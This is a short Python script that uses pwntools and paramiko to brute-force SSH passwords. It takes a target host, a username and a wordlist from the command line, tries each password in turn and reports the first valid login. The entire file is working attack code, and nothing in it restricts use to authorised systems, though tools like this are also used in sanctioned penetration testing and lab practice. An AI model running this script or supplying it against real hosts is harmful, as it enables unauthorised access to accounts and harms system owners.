import paramiko.ssh_exception
from pwn import *
import paramiko
import sys


host = sys.argv[1]          #The first argument is the host IP
user = sys.argv[2]          #The second argument is the username on the target
listPath = sys.argv[3]      #The therd argument is the password list path
attemps = 0


with open(listPath, "r") as passlist:
    for password in passlist:
        password = password.strip("\n")
        try:
            print("[{}] Trying password: '{}'".format(attemps, password))
            response = ssh(host=host, user=user, password=password, timeout=1)
            if response.connected():
                print("[>] Valid password is: '{}'".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attemps += 1